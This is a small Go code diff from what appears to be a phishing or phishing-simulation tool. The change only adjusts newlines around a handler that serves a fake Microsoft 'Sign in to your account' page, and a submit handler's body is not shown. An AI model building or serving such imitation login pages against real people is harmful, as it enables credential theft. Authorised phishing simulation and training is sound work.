@@ -85,7 +85,8 @@ func (t *Tracker) handlePage(w http.ResponseWriter, r *http.Request) {
 
 	// Fake Microsoft login page
 	w.Header().Set("Content-Type", "text/html")
-	w.Write([]byte(`<!DOCTYPE html>
+	w.Write([]byte(`
+<!DOCTYPE html>
 <html>
 <head><title>Sign in to your account</title>
 <style>
@@ -106,7 +107,8 @@ func (t *Tracker) handlePage(w http.ResponseWriter, r *http.Request) {
   </form>
 </div>
 </body>
-</html>`))
+</html>
+`))
 }
 
 func (t *Tracker) handleSubmit(w http.ResponseWriter, r *http.Request) {
